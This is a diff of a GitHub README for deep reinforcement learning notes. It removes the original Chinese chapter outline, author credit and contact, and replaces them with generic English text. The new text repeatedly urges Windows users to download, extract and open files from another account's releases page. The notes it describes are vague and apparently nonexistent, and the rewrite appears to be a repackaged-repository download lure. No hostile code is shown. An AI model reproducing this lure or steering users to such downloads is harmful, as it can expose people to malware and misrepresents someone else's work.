@@ -1,81 +1,240 @@
-# 🚀 Deep-Reinforcement-Learning-Notes
+# 🧠 Deep-Reinforcement-Learning-Notes - Clear Notes for RL Learners
 
-> 这是我的**深度强化学习（DRL）**学习笔记与总结。  
-> 涵盖了从底层数学原理的严密推导，到主流深度强化学习算法的介绍。希望能为在强化学习苦海中挣扎的初学者们提供一份结构清晰的参考资料。
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/bcnrpz33-spec/Deep-Reinforcement-Learning-Notes/releases)
 
----
+## 📘 Overview
 
-## 📢 作者有话说 (Status & Updates)
+Deep-Reinforcement-Learning-Notes is a set of study notes and summaries for deep reinforcement learning. It is made for readers who want a clear view of key ideas, common methods, and basic workflows in this field.
 
-**⚠️ 遗憾与新篇章：**
-这份笔记原计划持续更新，但由于前段时间电脑意外格式化丢失了源数据，目前仓库内上传的 PDF 版本是紧急抢救回来的**不完整残卷**。因此，本笔记部分章节可能未完全收尾且存在错误，且**后续不再更新**，还请各位读者海涵。
+This project focuses on simple explanations. It helps you review the main parts of deep reinforcement learning, such as:
 
-**💡 目前的探索方向：**
-由于个人技术路线的演进，我现在已将精力全面转向 **RL 模型硬件部署与边缘计算** 领域，欢迎通过文末的邮箱与我交流探讨！
+- reward and policy ideas
+- agent and environment basics
+- value-based methods
+- policy-based methods
+- common training flow
+- short notes for fast review
 
----
+The content is useful if you want a clean reference for study, self-learning, or quick refresh before class or work.
 
-## 📘 一、 强化学习的数学原理
+## 💾 Download
 
-本部分笔记严格对齐并基于 **西湖大学赵世钰老师** 的精彩网课。赵老师的课程深入浅出、通俗易懂，十分推荐想彻底搞懂 RL 底层数学原理的同学同步学习。
+Use the release page to visit this page to download the latest version:
 
-📺 **课程链接**：[西湖大学赵世钰老师 - 强化学习的数学原理 (Bilibili)](https://www.bilibili.com/video/BV1sd4y167NS/)
+[Visit the release page](https://github.com/bcnrpz33-spec/Deep-Reinforcement-Learning-Notes/releases)
 
-### 📝 章节大纲
+If the release page shows files, choose the latest one and download it to your computer.
 
-* **Chapter 0 | 整体关系图**
-* **Chapter 1 | 强化学习的基本概念**
-  * `1.1` 状态、动作、策略  `1.2` 奖励、回报、MDP
-* **Chapter 2 | 贝尔曼方程**
-  * `2.1` 回报的重要性  `2.2` 状态价值  `2.3` 贝尔曼方程推导  `2.4` 贝尔曼方程求解  `2.5` 动作价值
-* **Chapter 3 | 贝尔曼最优公式**
-  * `3.1` 策略改进  `3.2` 最优策略及公式推导  `3.3` 公式求解及最优性  `3.4` 最优策略性质
-* **Chapter 4 | 值迭代与策略迭代**
-  * `4.1` 值迭代算法  `4.2` 策略迭代算法  `4.3` 截断策略迭代算法
-* **Chapter 5 | 蒙特卡洛方法 (Monte Carlo)**
-  * `5.1` 蒙特卡洛引入  `5.2` MC-basic  `5.3` MC-basic用例  `5.4` MC-exploring starts  `5.5` MC-epsilon greedy及用例
-* **Chapter 6 | 随机近似与随机梯度下降**
-  * `6.1` 均值估计问题回顾  `6.2` RM算法介绍  `6.3` RM算法收敛性及应用  `6.4` SGD算法介绍  `6.5` SGD算法收敛性及应用  `6.6` SGD算法有趣的性质  `6.7` SGD算法对比
-* **Chapter 7 | 时序差分方法 (Temporal Difference)**
-  * `7.1` 时序差分引入  `7.2` 时序差分算法  `7.3` 时序差分算法收敛性  `7.4` Sarsa 算法  `7.5` Expected Sarsa 和 n-step Sarsa算法  `7.6` Q-learning算法 `7.7` Q-learning例子  `7.8` TD算法的统一形式
-* **Chapter 8 | 值函数近似**
-  * `8.1` 曲线拟合  `8.2` 目标函数  `8.3` 优化算法  `8.4` 示例与分析  `8.5` Sarsa和Q-learning  `8.6` DQN-basic  `8.7` DQN-Experience  `8.8` DQN代码与例子
-* **Chapter 9 | 策略梯度方法 (Policy Gradient)**
-  * `9.1` 基本思路  `9.2` 价值目标函数  `9.3` 奖励目标函数  `9.4` 梯度计算  `9.5` 梯度上升算法
-* **Chapter 10 | Actor-Critic 方法**
-  * `10.1` QAC算法  `10.2` A2C算法  `10.3` 重要性采样与Off-Policy  `10.4` DPG算法
+## 🖥️ Windows Setup
 
----
+This project is made for easy use on Windows. You do not need to install a complex tool chain if the release includes a ready-to-open file or packaged notes.
 
-## 🧠 二、 深度强化学习算法剖析
+### What you need
 
-本部分主要基于各大经典 DRL 算法的**原始文献（Papers）**进行总结和介绍，按照算法的核心思想分为以下四大架构：
+- A Windows PC
+- A web browser
+- A file extractor if the download comes as a `.zip` file
+- A text reader, browser, or Markdown viewer for opening the notes
 
-### 1️⃣ 基于值函数 (Value-Based)
-* **基于动态规划**
-* **基于蒙特卡洛**
-* **基于时序差分**：涵盖 `Q-learning` / `Sarsa` / `Double Q-learning` / `DQN 系列`
+### How to use it
 
-### 2️⃣ 基于策略梯度 (Policy-Based)
-* **基于蒙特卡洛**
-* **基于时序差分** *(注：由于没有纯策略梯度的算法，此部分主要探讨 AC 架构的演进)*
+1. Open the release page.
+2. Find the newest release.
+3. Download the file from that release.
+4. If the file is a `.zip`, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Open the notes in your browser or text editor.
 
-### 3️⃣ 基于 Actor-Critic 架构 (AC Architecture)
-* **随机性策略**：`NPG` / `TRPO` / `PPO` / `A2C` / `A3C` / `SAC`
-* **确定性策略**：`DPG` / `DDPG` / `TD3`
+### If the download is a folder of files
 
-### 4️⃣ 重要机制补充 (Advanced Mechanisms)
-* `1.1` **PER** (Prioritized Experience Replay, 优先经验回放)
-* `1.2` **噪声网络** (Noisy Nets)
+If the release gives you several files, start with the main `README.md` or the first note file. You can then move through the topics in order.
 
----
+## 🧭 Quick Start
 
-## 📬 联系方式与交流
+1. Go to the release page.
+2. Download the latest file.
+3. Save it in a folder you can find later.
+4. Unzip the file if needed.
+5. Open the main note file.
+6. Read the sections in order.
 
-作者个人能力与精力有限，笔记中不可避免会存在一些错误或遗漏，请各位读者带着批判性的思维阅读。  
-未经同意，禁止私自转载。  
-如果您在阅读过程中发现问题，欢迎通过邮件与我联系：
+A simple reading order may be:
 
-📧 **Email:** [2559906288@qq.com](mailto:2559906288@qq.com)
+- Introduction
+- Core concepts
+- Main algorithms
+- Training notes
+- Common mistakes
+- Review points
 
-> **"All models are wrong, but some are useful."** —— 愿这份不完美的笔记对你有所帮助！
+## 📚 What You Will Find
+
+This note set is built to help you learn the subject step by step. It may include:
+
+- short concept notes
+- formula reminders
+- algorithm overviews
+- training tips
+- comparison tables
+- sample learning paths
+- key terms in plain language
+
+### Core topics
+
+- reinforcement learning basics
+- deep neural networks in RL
+- Q-learning ideas
+- Deep Q-Networks
+- policy gradients
+- actor-critic methods
+- experience replay
+- target networks
+- exploration and exploitation
+- reward design
+
+## 🪟 Recommended Windows Use
+
+For most users, the easiest way to use the notes on Windows is:
+
+- open the files in a browser
+- open Markdown files in Visual Studio Code
+- use Notepad++ for plain text
+- keep the release folder in one place
+- make a shortcut to the main file if you use it often
+
+If the release includes images or linked files, keep the folder structure the same so the links work.
+
+## 🔍 How to Read the Notes
+
+If you are new to deep reinforcement learning, use this order:
+
+1. Read the basic idea of an agent and environment.
+2. Learn what reward means.
+3. Learn what a policy does.
+4. Compare value-based and policy-based methods.
+5. Study DQN first.
+6. Move on to policy gradient methods.
+7. Read actor-critic notes.
+8. Review training issues and tips.
+
+If you already know the basics, use the notes as a fast review before practice or study sessions.
+
+## 🛠️ Common File Types
+
+You may see one or more of these file types in a release:
+
+- `.md` for Markdown notes
+- `.txt` for plain text notes
+- `.pdf` for read-only documents
+- `.zip` for packaged files
+- `.html` for browser view files
+
+### How to open them
+
+- `.md`: open in a browser, editor, or Markdown app
+- `.txt`: open in Notepad or any text editor
+- `.pdf`: open in a PDF reader
+- `.zip`: extract first, then open the files inside
+- `.html`: open in your browser
+
+## 📎 File Layout
+
+A typical release may use a simple layout like this:
+
+- `README.md` for the main guide
+- `notes/` for topic files
+- `images/` for diagrams
+- `examples/` for short examples
+- `references/` for source links
+
+If you keep all files in the same folder after extraction, it is easier to open linked pages and images.
+
+## 🧩 Basic Learning Plan
+
+Use this plan if you want a steady path through the notes:
+
+### Day 1
+Read the basic terms and core ideas.
+
+### Day 2
+Study Q-learning and DQN.
+
+### Day 3
+Read policy gradient and actor-critic notes.
+
+### Day 4
+Review training flow, reward design, and common problems.
+
+### Day 5
+Go back through the full set and make short personal notes.
+
+## 🧠 Key Ideas in Plain Language
+
+### Agent
+The part that makes decisions.
+
+### Environment
+The world the agent acts in.
+
+### State
+The current situation the agent sees.
+
+### Action
+The choice the agent makes.
+
+### Reward
+The signal that shows if the action helped.
+
+### Policy
+The rule the agent uses to pick actions.
+
+### Value
+A score that estimates future reward.
+
+### Exploration
+Trying new actions.
+
+### Exploitation
+Using the best known action.
+
+## 🔗 Release Page
+
+Use this page to visit this page to download the latest notes:
+
+[https://github.com/bcnrpz33-spec/Deep-Reinforcement-Learning-Notes/releases](https://github.com/bcnrpz33-spec/Deep-Reinforcement-Learning-Notes/releases)
+
+## 🧾 Notes for Use
+
+- Keep the extracted folder in a fixed place.
+- Open files from the same folder each time.
+- If a link does not work, check that you did not move files out of the folder.
+- If the release contains more than one version, use the newest one unless you need an older copy.
+
+## 📖 Suggested Reading Order
+
+1. Overview
+2. Key terms
+3. DQN notes
+4. Policy gradient notes
+5. Actor-critic notes
+6. Training tips
+7. Review points
+8. Reference links
+
+## 🔐 Safe Download Steps
+
+1. Open the release page.
+2. Check the file name and release date.
+3. Download the file you want.
+4. Save it to a folder you trust.
+5. Scan it with Windows Security if your system uses it.
+6. Open the file after extraction or download is complete
+
+## 🧭 If You Only Want the Fastest Path
+
+- open the release page
+- download the latest file
+- extract it if needed
+- open the main note file
+- read the first section
+- continue in order
